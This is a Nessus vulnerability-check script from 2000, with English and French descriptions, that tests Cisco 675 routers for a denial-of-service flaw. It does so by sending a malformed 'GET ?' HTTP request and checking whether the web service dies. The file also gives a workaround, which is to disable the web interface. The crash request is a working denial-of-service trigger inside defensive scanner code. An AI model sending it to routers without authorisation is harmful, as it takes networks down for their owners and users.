#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added link to the Bugtraq message archive
#      Could support CVE-2001-0058
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10561);
 script_version ("$Revision: 1.15 $");

 name["english"] = "cisco 675 http DoS";
 name["francais"] = "Déni de service Cisco 675 par http";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to lock
the remote server (probably a Cisco router)
by doing the request :

	GET ?
	

You need to reboot it to make it work
again.
	
An attacker may use this flaw to crash this
host, thus preventing your network from
working properly.
	
Workaround : add the following rule
in your router :

	set web disabled
	write
	reboot


Solution :  contact CISCO for a fix

Reference : http://online.securityfocus.com/archive/1/147562

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de bloquer
le routeur distant en faisant la requete :

	GET ?
	
Vous devez le rebooter pour qu'il soit
de nouveau accessible.

Solution temporaire : rajoutez la regle :
	set web disabled
	write
	reboot
	
Solution : contactez CISCO pour un patch
Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes a Cisco router";
 summary["francais"] = "Fait planter un routeur Cisco";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CISCO";
 family["francais"] = "CISCO";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "os_fingerprint.nasl");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

os = get_kb_item("Host/OS/icmp");
if ( os && "CISCO" >!< os ) exit(0);


port = get_http_port(default:80);
banner = get_http_banner(port:port);
if ( "cisco-IOS" >!< banner ) exit(0);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  soc = http_open_socket(port);
  if(soc)
  {
  data = string("GET ? \r\n\r\n");
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  sleep(1);
  if(http_is_dead(port: port))security_hole(port);
  }
}
